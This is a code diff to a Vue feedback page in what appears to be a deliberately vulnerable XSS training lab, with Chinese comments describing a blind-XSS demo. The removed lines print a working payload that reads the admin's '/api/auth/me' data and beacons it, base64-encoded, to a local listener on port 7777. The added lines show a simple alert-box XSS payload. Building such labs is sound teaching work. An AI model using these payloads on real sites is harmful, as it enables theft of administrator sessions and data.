@@ -21,7 +21,7 @@
               v-model="form.content"
               type="textarea"
               :rows="8"
-              placeholder="请详细描述您的问题或建议...&#10;&#10;（支持HTML格式，用于演示盲XSS）"
+              placeholder="请详细描述您的问题或建议..."
             />
           </el-form-item>
           
@@ -35,11 +35,11 @@
         <!-- XSS 提示（场景 5 盲 XSS）：仅在 VULN 模式展示攻击示例 -->
         <div class="demo-info" v-if="configStore.xssMode === 'vuln'">
           <h3>⚠️ 盲 XSS 演示（场景 5）</h3>
-          <p>此表单的内容将被保存到数据库，当管理员在后台查看时触发 XSS。</p>
-          <p>尝试提交以下载荷（窃取管理员身份）：</p>
-          <code>&lt;img src=x onerror="fetch('/api/auth/me').then(r=&gt;r.json()).then(j=&gt;{new Image().src='http://127.0.0.1:7777/x?d='+btoa(JSON.stringify(j));});"&gt;</code>
-          <p style="margin-top: 12px;">或更隐蔽的方式：</p>
-          <code>&lt;img src=x onerror="fetch('/api/auth/me').then(r=&gt;r.json()).then(j=&gt;{console.log('管理员:',j);});"&gt;</code>
+          <p>当前处于 VULN 模式，反馈内容将不经过滤直接存储。</p>
+          <p>当管理员在后台查看反馈时，恶意代码将被触发。</p>
+          
+          <p style="margin-top: 12px;"><strong>基础 Payload：</strong></p>
+          <code>&lt;img src=x onerror=alert('Blind XSS')&gt;</code>
         </div>
       </div>
     </div>
@@ -48,8 +48,7 @@
 
 <script setup>
 // 反馈页（场景 5）：演示盲 XSS
-// - 用户提交的富文本会被存入数据库
-// - 管理员在后台查看详情时触发（VULN）/被拦截（SECURE）
+// - 攻击者提交恶意反馈，管理员后台查看时触发
 import { ref } from 'vue';
 import { useRouter } from 'vue-router';
 import { useConfigStore } from '@/stores/config';
